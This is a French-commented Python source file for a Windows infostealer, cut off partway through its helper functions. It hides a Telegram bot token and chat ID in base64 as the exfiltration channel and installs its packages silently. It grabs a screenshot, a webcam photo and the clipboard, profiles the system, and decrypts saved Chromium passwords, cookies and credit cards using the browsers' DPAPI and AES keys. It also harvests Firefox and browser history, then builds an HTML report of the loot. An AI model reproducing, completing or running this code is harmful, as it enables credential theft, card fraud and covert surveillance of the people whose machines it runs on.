import os
import json
import base64
import sqlite3
import shutil
import win32crypt
import subprocess
import sys
import tempfile
import requests
import socket
import uuid
import psutil
import platform
import winreg
import time
from Crypto.Cipher import AES
from datetime import datetime, timedelta
import csv
import io
from PIL import Image, ImageGrab
import cv2
import numpy as np
import sounddevice as sd
from scipy.io.wavfile import write
import threading

# ==================== CONFIGURATION SILENCIEUSE ====================

ENCODED_TOKEN   = b"ODMwMjU2NjY5NDpBQUgyOEVqVkoxR0ZLTVBmWUhBX0lnZFl6cTViVzhKRnRFdw=="
ENCODED_CHAT_ID = b"LTEwMDI5ODcwNzgyNTI="

def decode_b64(b: bytes) -> str:
    return base64.b64decode(b).decode("utf-8")

TELEGRAM_BOT_TOKEN = decode_b64(ENCODED_TOKEN)
TELEGRAM_CHAT_ID   = decode_b64(ENCODED_CHAT_ID)

TELEGRAM_API_URL = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendDocument"

# ==================== CONFIGURATION FICHIERS ====================
TEMP_DIR = tempfile.gettempdir()
COMPREHENSIVE_REPORT_FILE = os.path.join(TEMP_DIR, "rapport_ultra_complet.html")
SYSTEM_DATA_FILE = os.path.join(TEMP_DIR, "donnees_systeme.json")

# ==================== NAVIGATEURS SUPPORTÉS ====================
BROWSER_PATHS = {
    'Google Chrome': os.path.join(os.environ['USERPROFILE'], 'AppData', 'Local', 'Google', 'Chrome', 'User Data'),
    'Microsoft Edge': os.path.join(os.environ['USERPROFILE'], 'AppData', 'Local', 'Microsoft', 'Edge', 'User Data'),
    'Brave Browser': os.path.join(os.environ['USERPROFILE'], 'AppData', 'Local', 'BraveSoftware', 'Brave-Browser', 'User Data'),
    'Opera': os.path.join(os.environ['USERPROFILE'], 'AppData', 'Roaming', 'Opera Software', 'Opera Stable'),
    'Opera GX': os.path.join(os.environ['USERPROFILE'], 'AppData', 'Roaming', 'Opera Software', 'Opera GX Stable'),
    'Vivaldi': os.path.join(os.environ['USERPROFILE'], 'AppData', 'Local', 'Vivaldi', 'User Data'),
    'Chromium': os.path.join(os.environ['USERPROFILE'], 'AppData', 'Local', 'Chromium', 'User Data'),
    'Yandex Browser': os.path.join(os.environ['USERPROFILE'], 'AppData', 'Local', 'Yandex', 'YandexBrowser', 'User Data'),
    'Mozilla Firefox': os.path.join(os.environ['APPDATA'], 'Mozilla', 'Firefox'),
}

def install_dependencies_silent():
    """Installation silencieuse des dépendances"""
    dependencies = [
        "pycryptodome",
        "pywin32",
        "requests",
        "psutil",
        "pillow",
        "opencv-python",
        "sounddevice",
        "scipy",
        "numpy"
    ]
    
    for package in dependencies:
        try:
            subprocess.check_call([sys.executable, "-m", "pip", "install", package, "--quiet", "--user"], 
                                stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        except:
            pass

def get_system_info():
    """Récupère les informations système complètes"""
    system_info = {}
    
    try:
        # Informations de base
        system_info['Système'] = {
            'Système': platform.system(),
            'Version': platform.version(),
            'Architecture': platform.architecture()[0],
            'Processeur': platform.processor() or "Inconnu",
            'Nom Machine': platform.node(),
            'Utilisateur': os.getenv('USERNAME', 'Inconnu'),
            'Répertoire Utilisateur': os.path.expanduser('~')
        }
        
        # Adresses IP et MAC
        system_info['Réseau'] = get_network_info()
        
        # Mémoire et stockage
        system_info['Mémoire'] = get_memory_info()
        
        # Processus en cours
        system_info['Processus'] = get_running_processes()
        
        # Connexions réseau
        system_info['Connexions'] = get_network_connections()
        
        # Configuration matérielle détaillée
        system_info['Matériel'] = get_hardware_info()
        
        # Informations Windows
        system_info['Windows'] = get_windows_info()
        
    except Exception as e:
        system_info['Erreur'] = f"Erreur lors de la collecte: {str(e)}"
    
    return system_info

def get_windows_info():
    """Récupère les informations spécifiques à Windows"""
    windows_info = {}
    try:
        # Version de Windows
        windows_info['Version Windows'] = platform.release()
        windows_info['Édition Windows'] = platform.version()
        
        # Clé de produit Windows
        try:
            key_path = r"SOFTWARE\Microsoft\Windows NT\CurrentVersion"
            with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, key_path) as key:
                product_name = winreg.QueryValueEx(key, "ProductName")[0]
                digital_product_id = winreg.QueryValueEx(key, "DigitalProductId")[0]
                windows_info['Produit'] = product_name
        except:
            windows_info['Produit'] = "Inconnu"
            
    except Exception as e:
        windows_info['Erreur'] = str(e)
    
    return windows_info

def get_network_info():
    """Récupère les informations réseau"""
    network_info = {}
    
    try:
        # Adresse IP locale
        hostname = socket.gethostname()
        local_ip = socket.gethostbyname(hostname)
        network_info['IP Locale'] = local_ip
        
        # Adresse MAC
        mac = ':'.join(['{:02x}'.format((uuid.getnode() >> elements) & 0xff) 
                       for elements in range(0,2*6,2)][::-1])
        network_info['Adresse MAC'] = mac
        
        # Adresse IP publique
        try:
            public_ip = requests.get('https://api.ipify.org', timeout=5).text
            network_info['IP Publique'] = public_ip
        except:
            network_info['IP Publique'] = "Indisponible"
        
        # Interfaces réseau
        interfaces = psutil.net_if_addrs()
        network_info['Interfaces'] = {}
        
        for interface_name, interface_addresses in interfaces.items():
            network_info['Interfaces'][interface_name] = []
            for address in interface_addresses:
                network_info['Interfaces'][interface_name].append({
                    'Famille': str(address.family),
                    'Adresse': address.address,
                    'Masque': address.netmask or 'N/A'
                })
                
    except Exception as e:
        network_info['Erreur'] = str(e)
    
    return network_info

def get_memory_info():
    """Récupère les informations mémoire"""
    memory_info = {}
    
    try:
        # Mémoire virtuelle
        virt_mem = psutil.virtual_memory()
        memory_info['Mémoire Virtuelle'] = {
            'Totale': f"{virt_mem.total // (1024**3)} Go",
            'Disponible': f"{virt_mem.available // (1024**3)} Go",
            'Utilisée': f"{virt_mem.used // (1024**3)} Go",
            'Pourcentage': f"{virt_mem.percent}%"
        }
        
        # Mémoire swap
        swap_mem = psutil.swap_memory()
        if swap_mem.total > 0:
            memory_info['Mémoire Swap'] = {
                'Totale': f"{swap_mem.total // (1024**3)} Go",
                'Utilisée': f"{swap_mem.used // (1024**3)} Go",
                'Pourcentage': f"{swap_mem.percent}%"
            }
        else:
            memory_info['Mémoire Swap'] = "Désactivée"
        
        # Disques
        disks = {}
        for partition in psutil.disk_partitions():
            try:
                usage = psutil.disk_usage(partition.mountpoint)
                disks[partition.device] = {
                    'Point de montage': partition.mountpoint,
                    'Type': partition.fstype,
                    'Espace total': f"{usage.total // (1024**3)} Go",
                    'Espace utilisé': f"{usage.used // (1024**3)} Go",
                    'Espace libre': f"{usage.free // (1024**3)} Go",
                    'Pourcentage': f"{usage.percent}%"
                }
            except:
                continue
        memory_info['Disques'] = disks
        
    except Exception as e:
        memory_info['Erreur'] = str(e)
    
    return memory_info

def get_running_processes():
    """Récupère la liste des processus"""
    processes = []
    
    try:
        for proc in psutil.process_iter(['pid', 'name', 'username', 'memory_info', 'cpu_percent']):
            try:
                processes.append({
                    'PID': proc.info['pid'],
                    'Nom': proc.info['name'] or 'N/A',
                    'Utilisateur': proc.info['username'] or 'N/A',
                    'Mémoire': f"{proc.info['memory_info'].rss // (1024**2)} MB" if proc.info['memory_info'] else 'N/A',
                    'CPU': f"{proc.info['cpu_percent']}%" if proc.info['cpu_percent'] else 'N/A'
                })
            except:
                continue
    except Exception as e:
        processes.append({'Erreur': str(e)})
    
    return processes[:50]  # Limiter à 50 processus

def get_network_connections():
    """Récupère les connexions réseau"""
    connections = []
    
    try:
        for conn in psutil.net_connections(kind='inet'):
            try:
                local_addr = f"{conn.laddr.ip}:{conn.laddr.port}" if conn.laddr else 'N/A'
                remote_addr = f"{conn.raddr.ip}:{conn.raddr.port}" if conn.raddr else 'N/A'
                
                connections.append({
                    'Protocole': str(conn.type),
                    'IP Locale': local_addr,
                    'IP Distante': remote_addr,
                    'Statut': conn.status or 'N/A',
                    'PID': conn.pid or 'N/A'
                })
            except:
                continue
    except Exception as e:
        connections.append({'Erreur': str(e)})
    
    return connections[:100]  # Limiter à 100 connexions

def get_hardware_info():
    """Récupère les informations matérielles détaillées"""
    hardware = {}
    
    try:
        # CPU
        cpu_freq = psutil.cpu_freq()
        hardware['CPU'] = {
            'Cœurs Physiques': psutil.cpu_count(logical=False) or 'N/A',
            'Cœurs Logiques': psutil.cpu_count(logical=True) or 'N/A',
            'Fréquence Actuelle': f"{cpu_freq.current} MHz" if cpu_freq else 'N/A',
            'Fréquence Max': f"{cpu_freq.max} MHz" if cpu_freq else 'N/A',
            'Utilisation': f"{psutil.cpu_percent(interval=1)}%"
        }
        
        # Batterie
        try:
            battery = psutil.sensors_battery()
            if battery:
                hardware['Batterie'] = {
                    'Pourcentage': f"{battery.percent}%",
                    'Branché': "Oui" if battery.power_plugged else "Non",
                    'Temps restant': f"{battery.secsleft // 3600}h {(battery.secsleft % 3600) // 60}m" if battery.secsleft > 0 else "Incalculable"
                }
        except:
            hardware['Batterie'] = "Information non disponible"
            
        # Informations GPU (basiques)
        try:
            import wmi
            w = wmi.WMI()
            gpus = []
            for gpu in w.Win32_VideoController():
                gpus.append({
                    'Nom': gpu.Name,
                    'RAM': f"{int(gpu.AdapterRAM) // (1024**3)} Go" if gpu.AdapterRAM else 'N/A'
                })
            hardware['GPU'] = gpus
        except:
            hardware['GPU'] = "Information non disponible"
            
    except Exception as e:
        hardware['Erreur'] = str(e)
    
    return hardware

def capture_screenshot():
    """Capture d'écran silencieuse"""
    try:
        screenshot = ImageGrab.grab(all_screens=True)
        screenshot_path = os.path.join(TEMP_DIR, "screenshot.png")
        screenshot.save(screenshot_path, "PNG")
        return screenshot_path
    except Exception as e:
        return None

def capture_webcam():
    """Capture webcam silencieuse"""
    try:
        cap = cv2.VideoCapture(0)
        if cap.isOpened():
            ret, frame = cap.read()
            if ret:
                webcam_path = os.path.join(TEMP_DIR, "webcam.jpg")
                cv2.imwrite(webcam_path, frame)
                cap.release()
                return webcam_path
        cap.release()
    except:
        pass
    return None

def get_clipboard():
    """Récupère le contenu du presse-papiers"""
    try:
        import win32clipboard
        win32clipboard.OpenClipboard()
        clipboard_data = ""
        
        try:
            clipboard_data = win32clipboard.GetClipboardData(win32clipboard.CF_UNICODETEXT)
        except:
            pass
            
        win32clipboard.CloseClipboard()
        return clipboard_data if clipboard_data else "Presse-papiers vide ou contenu non textuel"
    except:
        return "Erreur accès presse-papiers"

def get_encryption_key(browser_path):
    """Récupère la clé de chiffrement AES"""
    try:
        local_state_path = os.path.join(browser_path, "Local State")
        
        if not os.path.exists(local_state_path):
            return None
            
        with open(local_state_path, "r", encoding="utf-8") as f:
            local_state = json.loads(f.read())
        
        encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        encrypted_key = encrypted_key[5:]
        return win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
        
    except Exception as e:
        return None

def decrypt_password(ciphertext, key):
    """Déchiffre les données"""
    if not ciphertext:
        return ""
    
    try:
        if ciphertext.startswith(b'v10') or ciphertext.startswith(b'v11'):
            iv = ciphertext[3:15]
            encrypted_data = ciphertext[15:-16]
            cipher = AES.new(key, AES.MODE_GCM, iv)
            return cipher.decrypt(encrypted_data).decode('utf-8', errors='ignore')
        else:
            return win32crypt.CryptUnprotectData(ciphertext, None, None, None, 0)[1].decode('utf-8', errors='ignore')
    except Exception:
        try:
            return win32crypt.CryptUnprotectData(ciphertext, None, None, None, 0)[1].decode('utf-8', errors='ignore')
        except:
            return "❌ Erreur déchiffrement"

def get_firefox_profiles():
    """Récupère les profils Firefox"""
    firefox_path = BROWSER_PATHS['Mozilla Firefox']
    profiles_ini = os.path.join(firefox_path, 'profiles.ini')
    
    profiles = []
    if os.path.exists(profiles_ini):
        try:
            with open(profiles_ini, 'r', encoding='utf-8') as f:
                content = f.read()
            
            # Parser profiles.ini pour trouver les profils
            for line in content.split('\n'):
                if line.startswith('Path='):
                    profile_path = line.split('=')[1].strip()
                    full_path = os.path.join(firefox_path, profile_path)
                    if os.path.exists(full_path):
                        profiles.append(full_path)
        except:
            pass
    
    # Si pas de profiles.ini, chercher les dossiers de profils typiques
    if not profiles and os.path.exists(firefox_path):
        for item in os.listdir(firefox_path):
            item_path = os.path.join(firefox_path, item)
            if os.path.isdir(item_path) and '.' in item and 'default' in item:
                profiles.append(item_path)
    
    return profiles

def extract_firefox_data(browser_name, profile_path):
    """Extrait les données de Firefox"""
    data = {
        'passwords': [],
        'history': [],
        'cookies': [],
        'credit_cards': [],
        'autofill': [],
        'bookmarks': [],
        'downloads': []
    }
    
    try:
        # Mots de passe Firefox (logins.json)
        logins_file = os.path.join(profile_path, 'logins.json')
        if os.path.exists(logins_file):
            try:
                with open(logins_file, 'r', encoding='utf-8') as f:
                    logins_data = json.load(f)
                
                for login in logins_data.get('logins', []):
                    data['passwords'].append({
                        'url': login.get('hostname', ''),
                        'username': login.get('username', ''),
                        'password': '🔒 Mot de passe chiffré Firefox',
                        'browser': browser_name,
                        'profile': os.path.basename(profile_path)
                    })
            except:
                pass
        
        # Historique Firefox (places.sqlite)
        places_db = os.path.join(profile_path, 'places.sqlite')
        if os.path.exists(places_db):
            try:
                temp_db = os.path.join(TEMP_DIR, "temp_firefox_places.db")
                shutil.copy2(places_db, temp_db)
                
                conn = sqlite3.connect(temp_db)
                cursor = conn.cursor()
                cursor.execute("SELECT url, title, visit_count FROM moz_places ORDER BY visit_count DESC LIMIT 500")
                
                for url, title, visit_count in cursor.fetchall():
                    if url:
                        data['history'].append({
                            'url': url,
                            'title': title if title else "Sans titre",
                            'visit_count': visit_count,
                            'browser': browser_name,
                            'profile': os.path.basename(profile_path)
                        })
                
                conn.close()
                os.remove(temp_db)
            except:
                pass
        
        # Cookies Firefox (cookies.sqlite)
        cookies_db = os.path.join(profile_path, 'cookies.sqlite')
        if os.path.exists(cookies_db):
            try:
                temp_db = os.path.join(TEMP_DIR, "temp_firefox_cookies.db")
                shutil.copy2(cookies_db, temp_db)
                
                conn = sqlite3.connect(temp_db)
                cursor = conn.cursor()
                cursor.execute("SELECT host, name, value FROM moz_cookies LIMIT 200")
                
                for host, name, value in cursor.fetchall():
                    if host and name:
                        data['cookies'].append({
                            'host': host,
                            'name': name,
                            'value': value[:100] + "..." if len(value) > 100 else value,
                            'browser': browser_name,
                            'profile': os.path.basename(profile_path)
                        })
                
                conn.close()
                os.remove(temp_db)
            except:
                pass
        
        # Signets Firefox (places.sqlite)
        if os.path.exists(places_db):
            try:
                temp_db = os.path.join(TEMP_DIR, "temp_firefox_bookmarks.db")
                shutil.copy2(places_db, temp_db)
                
                conn = sqlite3.connect(temp_db)
                cursor = conn.cursor()
                cursor.execute("SELECT url, title FROM moz_bookmarks JOIN moz_places ON moz_bookmarks.fk = moz_places.id WHERE url IS NOT NULL")
                
                for url, title in cursor.fetchall():
                    if url:
                        data['bookmarks'].append({
                            'name': title if title else "Sans titre",
                            'url': url,
                            'browser': browser_name,
                            'profile': os.path.basename(profile_path)
                        })
                
                conn.close()
                os.remove(temp_db)
            except:
                pass
                
    except Exception as e:
        pass
    
    return data

def extract_all_browser_data():
    """Extrait toutes les données des navigateurs"""
    all_data = {
        'passwords': [],
        'history': [],
        'cookies': [],
        'credit_cards': [],
        'autofill': [],
        'bookmarks': [],
        'downloads': []
    }
    
    for browser_name, browser_path in BROWSER_PATHS.items():
        if not os.path.exists(browser_path):
            continue
        
        # Traitement spécial pour Firefox
        if browser_name == 'Mozilla Firefox':
            firefox_profiles = get_firefox_profiles()
            for profile_path in firefox_profiles:
                try:
                    profile_data = extract_firefox_data(browser_name, profile_path)
                    for data_key in profile_data:
                        all_data[data_key].extend(profile_data[data_key])
                except:
                    continue
            continue
        
        # Navigateurs basés sur Chromium
        key = get_encryption_key(browser_path)
        
        # Recherche des profils
        profiles = []
        if os.path.exists(os.path.join(browser_path, "Default")):
            profiles.append("Default")
        
        for item in os.listdir(browser_path):
            item_path = os.path.join(browser_path, item)
            if os.path.isdir(item_path) and (item.startswith("Profile ") or item.startswith("Profile_")):
                profiles.append(item)
        
        for profile in profiles:
            try:
                profile_data = extract_profile_data(browser_name, browser_path, profile, key)
                for data_key in profile_data:
                    all_data[data_key].extend(profile_data[data_key])
            except:
                continue
    
    return all_data

def extract_profile_data(browser_name, browser_path, profile, key):
    """Extrait les données d'un profil spécifique"""
    profile_data = {
        'passwords': extract_passwords(browser_name, browser_path, profile, key),
        'history': extract_history(browser_name, browser_path, profile),
        'cookies': extract_cookies(browser_name, browser_path, profile, key),
        'credit_cards': extract_credit_cards(browser_name, browser_path, profile, key),
        'autofill': extract_autofill(browser_name, browser_path, profile),
        'bookmarks': extract_bookmarks(browser_name, browser_path, profile),
        'downloads': extract_downloads(browser_name, browser_path, profile)
    }
    
    return profile_data

def extract_passwords(browser_name, browser_path, profile, key):
    """Extrait les mots de passe"""
    data = []
    login_db = os.path.join(browser_path, profile, "Login Data")
    
    if not os.path.exists(login_db):
        return data
    
    temp_db = None
    try:
        temp_db = os.path.join(TEMP_DIR, f"temp_passwords_{browser_name}_{profile}.db")
        shutil.copy2(login_db, temp_db)
        
        conn = sqlite3.connect(temp_db)
        cursor = conn.cursor()
        cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
        
        for url, username, password_value in cursor.fetchall():
            if url and username and password_value:
                decrypted_password = decrypt_password(password_value, key) if key else "Clé non disponible"
                if decrypted_password and not decrypted_password.startswith("❌ Erreur"):
                    data.append({
                        'url': url,
                        'username': username,
                        'password': decrypted_password,
                        'browser': browser_name,
                        'profile': profile
                    })
        
        conn.close()
    except:
        pass
    finally:
        if temp_db and os.path.exists(temp_db):
            try:
                os.remove(temp_db)
            except:
                pass
    
    return data

def extract_history(browser_name, browser_path, profile):
    """Extrait l'historique complet (500 derniers sites)"""
    data = []
    history_db = os.path.join(browser_path, profile, "History")
    
    if not os.path.exists(history_db):
        return data
    
    temp_db = None
    try:
        temp_db = os.path.join(TEMP_DIR, f"temp_history_{browser_name}_{profile}.db")
        shutil.copy2(history_db, temp_db)
        
        conn = sqlite3.connect(temp_db)
        cursor = conn.cursor()
        cursor.execute("SELECT url, title, visit_count, last_visit_time FROM urls ORDER BY last_visit_time DESC LIMIT 500")
        
        for url, title, visit_count, last_visit_time in cursor.fetchall():
            if url:
                data.append({
                    'url': url,
                    'title': title if title else "Sans titre",
                    'visit_count': visit_count,
                    'last_visit': last_visit_time,
                    'browser': browser_name,
                    'profile': profile
                })
        
        conn.close()
    except:
        pass
    finally:
        if temp_db and os.path.exists(temp_db):
            try:
                os.remove(temp_db)
            except:
                pass
    
    return data

def extract_cookies(browser_name, browser_path, profile, key):
    """Extrait les cookies de session"""
    data = []
    cookies_db = os.path.join(browser_path, profile, "Cookies")
    
    if not os.path.exists(cookies_db):
        return data
    
    temp_db = None
    try:
        temp_db = os.path.join(TEMP_DIR, f"temp_cookies_{browser_name}_{profile}.db")
        shutil.copy2(cookies_db, temp_db)
        
        conn = sqlite3.connect(temp_db)
        cursor = conn.cursor()
        cursor.execute("SELECT host_key, name, encrypted_value, path, expires_utc FROM cookies LIMIT 200")
        
        for host, name, encrypted_value, path, expires in cursor.fetchall():
            if host and name:
                decrypted_value = decrypt_password(encrypted_value, key) if key else "Clé non disponible"
                if decrypted_value and not decrypted_value.startswith("❌ Erreur"):
                    data.append({
                        'host': host,
                        'name': name,
                        'value': decrypted_value[:100] + "..." if len(decrypted_value) > 100 else decrypted_value,
                        'path': path,
                        'expires': expires,
                        'browser': browser_name,
                        'profile': profile
                    })
        
        conn.close()
    except:
        pass
    finally:
        if temp_db and os.path.exists(temp_db):
            try:
                os.remove(temp_db)
            except:
                pass
    
    return data

def extract_credit_cards(browser_name, browser_path, profile, key):
    """Extrait les cartes de crédit"""
    data = []
    cards_db = os.path.join(browser_path, profile, "Web Data")
    
    if not os.path.exists(cards_db):
        return data
    
    temp_db = None
    try:
        temp_db = os.path.join(TEMP_DIR, f"temp_cards_{browser_name}_{profile}.db")
        shutil.copy2(cards_db, temp_db)
        
        conn = sqlite3.connect(temp_db)
        cursor = conn.cursor()
        
        try:
            cursor.execute("SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted FROM credit_cards")
            for name, exp_month, exp_year, card_encrypted in cursor.fetchall():
                if name and card_encrypted:
                    card_number = decrypt_password(card_encrypted, key) if key else "Clé non disponible"
                    if card_number and not card_number.startswith("❌ Erreur"):
                        data.append({
                            'name': name,
                            'number': card_number,
                            'expiry': f"{exp_month}/{exp_year}",
                            'browser': browser_name,
                            'profile': profile
                        })
        except:
            pass
        
        conn.close()
    except:
        pass
    finally:
        if temp_db and os.path.exists(temp_db):
            try:
                os.remove(temp_db)
            except:
                pass
    
    return data

def extract_autofill(browser_name, browser_path, profile):
    """Extrait les données de formulaire"""
    data = []
    autofill_db = os.path.join(browser_path, profile, "Web Data")
    
    if not os.path.exists(autofill_db):
        return data
    
    temp_db = None
    try:
        temp_db = os.path.join(TEMP_DIR, f"temp_autofill_{browser_name}_{profile}.db")
        shutil.copy2(autofill_db, temp_db)
        
        conn = sqlite3.connect(temp_db)
        cursor = conn.cursor()
        
        cursor.execute("SELECT name, value FROM autofill LIMIT 100")
        for name, value in cursor.fetchall():
            if name and value:
                data.append({
                    'field': name,
                    'value': value,
                    'browser': browser_name,
                    'profile': profile
                })
        
        conn.close()
    except:
        pass
    finally:
        if temp_db and os.path.exists(temp_db):
            try:
                os.remove(temp_db)
            except:
                pass
    
    return data

def extract_bookmarks(browser_name, browser_path, profile):
    """Extrait les favoris"""
    data = []
    bookmarks_file = os.path.join(browser_path, profile, "Bookmarks")
    
    if not os.path.exists(bookmarks_file):
        return data
    
    try:
        with open(bookmarks_file, 'r', encoding='utf-8') as f:
            bookmarks_data = json.load(f)
        
        def extract_bookmarks_recursive(node):
            if 'children' in node:
                for child in node['children']:
                    extract_bookmarks_recursive(child)
            if node.get('type') == 'url':
                data.append({
                    'name': node.get('name', ''),
                    'url': node.get('url', ''),
                    'date_added': node.get('date_added', ''),
                    'browser': browser_name,
                    'profile': profile
                })
        
        if 'roots' in bookmarks_data:
            for root in bookmarks_data['roots'].values():
                extract_bookmarks_recursive(root)
                
    except:
        pass
    
    return data

def extract_downloads(browser_name, browser_path, profile):
    """Extrait l'historique des téléchargements"""
    data = []
    history_db = os.path.join(browser_path, profile, "History")
    
    if not os.path.exists(history_db):
        return data
    
    temp_db = None
    try:
        temp_db = os.path.join(TEMP_DIR, f"temp_downloads_{browser_name}_{profile}.db")
        shutil.copy2(history_db, temp_db)
        
        conn = sqlite3.connect(temp_db)
        cursor = conn.cursor()
        
        cursor.execute("SELECT target_path, tab_url, total_bytes, start_time FROM downloads")
        for target_path, tab_url, total_bytes, start_time in cursor.fetchall():
            if target_path:
                data.append({
                    'file_path': target_path,
                    'url': tab_url,
                    'size': f"{total_bytes // (1024**2)} MB" if total_bytes else "Inconnu",
                    'start_time': start_time,
                    'browser': browser_name,
                    'profile': profile
                })
        
        conn.close()
    except:
        pass
    finally:
        if temp_db and os.path.exists(temp_db):
            try:
                os.remove(temp_db)
            except:
                pass
    
    return data

def format_data_for_html(data):
    """Formate les données pour l'affichage HTML"""
    if isinstance(data, dict):
        return "<br>".join([f"<strong>{k}:</strong> {v}" for k, v in data.items()])
    elif isinstance(data, list):
        return "<br>".join([str(item) for item in data])
    else:
        return str(data)

def create_comprehensive_html_report(system_info, browser_data, media_files):
    """Crée un rapport HTML ultra-complet avec 7 onglets"""
    
    # Statistiques pour le dashboard
    total_passwords = len(browser_data.get('passwords', []))
    total_history = len(browser_data.get('history', []))
    total_cookies = len(browser_data.get('cookies', []))
    total_processes = len(system_info.get('Processus', []))
    total_connections = len(system_info.get('Connexions', []))
    memory_usage = system_info.get('Mémoire', {}).get('Mémoire Virtuelle', {}).get('Pourcentage', 'N/A')
    
    # Conversion des images en base64 pour l'intégration HTML
    screenshot_base64 = image_to_base64(media_files.get('screenshot'))
    webcam_base64 = image_to_base64(media_files.get('webcam'))
    
    html_content = f"""
<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>🔓 Rapport Ultra Complet - Analyse Système</title>
    <style>
        :root {{
            --primary: #667eea;
            --secondary: #764ba2;
            --success: #28a745;
            --danger: #dc3545;
            --warning: #ffc107;
            --info: #17a2b8;
            --dark: #343a40;
            --light: #f8f9fa;
        }}
        * {{ margin:0; padding:0; box-sizing:border-box; }}
        body {{
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            padding: 20px;
            color: #333;
        }}
        .container {{
            max-width: 1400px;
            margin: 0 auto;
            background: white;
            border-radius: 20px;
            box-shadow: 0 20px 40px rgba(0,0,0,0.1);
            overflow: hidden;
        }}
        .header {{
            background: linear-gradient(135deg, #2c3e50 0%, #34495e 100%);
            color: white;
            padding: 30px;
            text-align: center;
        }}
        .header h1 {{ font-size: 2.5em; margin-bottom: 10px; }}
        .tabs {{
            display: flex; background: #f8f9fa; border-bottom: 1px solid #dee2e6; flex-wrap: wrap;
        }}
        .tab {{
            padding: 15px 25px; cursor: pointer; border: none; background: none;
            font-size: 1em; font-weight: 600; color: #6c757d;
            transition: all 0.3s ease; border-bottom: 3px solid transparent;
        }}
        .tab:hover {{ color: var(--primary); background: rgba(102,126,234,0.1); }}
        .tab.active {{ color: var(--primary); border-bottom-color: var(--primary); background: white; }}
        .tab-content {{ display: none; padding: 30px; animation: fadeIn 0.5s ease; }}
        .tab-content.active {{ display: block; }}
        @keyframes fadeIn {{ from {{ opacity:0; transform: translateY(20px); }} to {{ opacity:1; transform:translateY(0); }} }}
        .stats-grid {{ display:grid; grid-template-columns:repeat(auto-fit,minmax(200px,1fr)); gap:20px; margin-bottom:30px; }}
        .stat-item {{
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color:white; padding:20px; border-radius:10px; text-align:center;
        }}
        .stat-number {{ font-size:2.5em; font-weight:bold; margin-bottom:5px; }}
        .json-view {{
            background:#f8f9fa; border-radius:8px; padding:15px;
            font-family:'Courier New', monospace; font-size:0.9em;
            max-height:400px; overflow-y:auto; white-space:pre-wrap;
        }}
        .media-grid {{ display:grid; grid-template-columns:repeat(auto-fit,minmax(300px,1fr)); gap:20px; }}
        .media-item img {{ width:100%; height:200px; object-fit:cover; border-radius:10px; }}
        .password-item, .history-item {{
            background:#f8f9fa; border-radius:8px; padding:15px; margin-bottom:10px;
        }}
        .password-item {{ border-left:4px solid var(--success); }}
        .history-item {{ border-left:4px solid var(--info); }}
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>🔓 Rapport Ultra Complet</h1>
            <p>Analyse système complète - Généré le {datetime.now().strftime("%d/%m/%Y à %H:%M:%S")}</p>
        </div>

        <div class="tabs">
            <button class="tab active" onclick="switchTab(event, 'dashboard')">📊 Dashboard</button>
            <button class="tab" onclick="switchTab(event, 'system')">🖥️ Système</button>
            <button class="tab" onclick="switchTab(event, 'network')">🌐 Réseau</button>
            <button class="tab" onclick="switchTab(event, 'media')">📸 Médias</button>
            <button class="tab" onclick="switchTab(event, 'browsers')">🔍 Navigateurs</button>
            <button class="tab" onclick="switchTab(event, 'passwords')">🔑 Mots de passe</button>
            <button class="tab" onclick="switchTab(event, 'history')">📚 Historique</button>
        </div>

        <!-- Dashboard -->
        <div id="dashboard" class="tab-content active">
            <h2>📊 Dashboard</h2>
            <div class="stats-grid">
                <div class="stat-item"><div class="stat-number">{total_passwords}</div><div>Mots de passe</div></div>
                <div class="stat-item"><div class="stat-number">{total_history}</div><div>Historique</div></div>
                <div class="stat-item"><div class="stat-number">{total_cookies}</div><div>Cookies</div></div>
                <div class="stat-item"><div class="stat-number">{total_processes}</div><div>Processus</div></div>
                <div class="stat-item"><div class="stat-number">{total_connections}</div><div>Connexions</div></div>
                <div class="stat-item"><div class="stat-number">{memory_usage}</div><div>Mémoire</div></div>
            </div>
        </div>

        <!-- Système -->
        <div id="system" class="tab-content">
            <h2>🖥️ Informations Système</h2>
            <div class="json-view">{json.dumps(system_info, indent=4, ensure_ascii=False)}</div>
        </div>

        <!-- Réseau -->
        <div id="network" class="tab-content">
            <h2>🌐 Connexions Réseau</h2>
            <div class="json-view">{json.dumps(system_info.get('Connexions', []), indent=4, ensure_ascii=False)}</div>
        </div>

        <!-- Médias -->
        <div id="media" class="tab-content">
            <h2>📸 Médias</h2>
            <div class="media-grid">
                <div class="media-item">
                    <img src="data:image/png;base64,{screenshot_base64}" alt="Capture d'écran">
                </div>
                <div class="media-item">
                    <img src="data:image/png;base64,{webcam_base64}" alt="Webcam">
                </div>
            </div>
        </div>

        <!-- Navigateurs -->
        <div id="browsers" class="tab-content">
            <h2>🔍 Données Navigateurs</h2>
            <div class="json-view">{json.dumps(browser_data, indent=4, ensure_ascii=False)}</div>
        </div>

        <!-- Mots de passe -->
        <div id="passwords" class="tab-content">
            <h2>🔑 Mots de passe</h2>
            {"".join([f"<div class='password-item'><b>{p.get('url','N/A')}</b> - {p.get('username','')} : {p.get('password','')}</div>" for p in browser_data.get('passwords', [])])}
        </div>

        <!-- Historique -->
        <div id="history" class="tab-content">
            <h2>📚 Historique</h2>
            {"".join([f"<div class='history-item'><b>{h.get('url','')}</b> - {h.get('title','')}</div>" for h in browser_data.get('history', [])])}
        </div>
    </div>

    <script>
        function switchTab(event, tabName) {{
            document.querySelectorAll('.tab-content').forEach(tab => tab.classList.remove('active'));
            document.querySelectorAll('.tab').forEach(tab => tab.classList.remove('active'));
            document.getElementById(tabName).classList.add('active');
            event.currentTarget.classList.add('active');
        }}
    </script>
</body>
</html>
"""   
    # Sauvegarde du fichier HTML
    with open(COMPREHENSIVE_REPORT_FILE, 'w', encoding='utf-8') as f:
        f.write(html_content)
    
    return COMPREHENSIVE_REPORT_FILE

def image_to_base64(image_path):
